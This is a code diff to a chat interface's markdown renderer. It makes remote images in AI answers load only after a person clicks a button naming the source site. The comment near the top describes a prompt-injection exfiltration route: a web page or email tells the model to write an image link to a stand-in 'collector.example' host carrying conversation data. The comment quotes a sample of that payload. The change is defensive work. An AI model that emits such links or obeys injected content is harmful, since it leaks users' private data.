@@ -7250,6 +7250,44 @@ try{ window.openArtifact=openArtifact; window.closeArtifact=closeArtifact; }catc
    terminate a href/src/alt value early and inject an inline event handler
    (onerror/onmouseover) - the DOM-XSS vector from the security audit (AMV-004). */
 function _mdAttr(s){ return String(s==null?'':s).replace(/"/g,'&quot;').replace(/'/g,'&#39;').replace(/`/g,'&#96;'); }
+/* AN IMAGE ADDRESS IN AN ANSWER IS A REQUEST WAITING TO BE SENT.  (AMV-AUD-023)
+
+   Markdown `![x](https://...)` became an <img>, and the browser fetches an
+   <img> the moment it is drawn - no click, nobody asked. The address is
+   written by the model, and the model writes what the content it read tells
+   it to: a web page or an email can ask for
+   `![](https://collector.example/?d=<something from this conversation>)`, and
+   drawing the answer sends it. That is an outbound channel nobody approved.
+
+   So a remote image arrives as a button naming the site it would be fetched
+   from, and is fetched only when somebody presses it. Pressed once, that
+   address is shown directly for the rest of the session - a person who chose
+   to load a picture should not be asked again every time the thread repaints.
+   Images AMV holds itself (data:, blob:) never match this rule and draw as
+   before. */
+const _MD_IMG_OK = new Set();
+function _mdRemoteImg(url, alt){
+  const real = String(url).replace(/&amp;/g, '&');
+  if(_MD_IMG_OK.has(real)) return '<img src="'+_mdAttr(url)+'" alt="'+_mdAttr(alt)+'" class="chat-img" loading="lazy">';
+  let host = '';
+  try{ host = new URL(real).hostname; }catch(e){ return _mdAttr(alt || 'image'); }
+  const id = 'mdimg-' + Math.random().toString(36).slice(2, 10);
+  return '<button type="button" class="md-img-ask" id="'+id+'" data-dact="_mdShowImg" data-darg="'+id+'"'
+       + ' data-src="'+_mdAttr(url)+'" data-alt="'+_mdAttr(alt)+'">'
+       + 'Show image from <b>'+_mdAttr(host)+'</b>'+(alt ? ' <span class="md-img-alt">('+alt+')</span>' : '')
+       + '</button>';
+}
+function _mdShowImg(id){
+  const b = document.getElementById(String(id || ''));
+  if(!b) return;
+  const src = b.getAttribute('data-src') || '';
+  if(!/^https?:\/\//i.test(src)) return;
+  _MD_IMG_OK.add(src);
+  const img = document.createElement('img');
+  img.src = src; img.alt = b.getAttribute('data-alt') || ''; img.className = 'chat-img'; img.loading = 'lazy';
+  b.replaceWith(img);
+}
+try{ window._mdShowImg = _mdShowImg; }catch(e){}
 function md(text) {  if(!text) return '';
   let t = _noDash(text).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
 
@@ -7370,7 +7408,7 @@ function md(text) {  if(!text) return '';
     return ordered ? '<ol>'+items+'</ol>' : '<ul>'+items+'</ul>';
   });
   t = t.replace(/`([^`\n]+)`/g,'<code>$1</code>');
-  t = t.replace(/!\[([^\]]*)\]\((https?:\/\/[^)]+)\)/g, (m,alt,url)=>'<img src="'+_mdAttr(url)+'" alt="'+_mdAttr(alt)+'" class="chat-img" loading="lazy">');
+  t = t.replace(/!\[([^\]]*)\]\((https?:\/\/[^)]+)\)/g, (m,alt,url)=>_mdRemoteImg(url, alt));
   // Link TEXT ($1) is intentionally left as already-rendered inline HTML (bold/
   // italic/code were applied above); only the href URL is attribute-escaped.
   t = t.replace(/\[(.+?)\]\((https?:\/\/[^)]+)\)/g, (m,txt,url)=>'<a href="'+_mdAttr(url)+'" target="_blank" rel="noopener noreferrer" style="color:var(--accent-txt)">'+txt+'</a>');
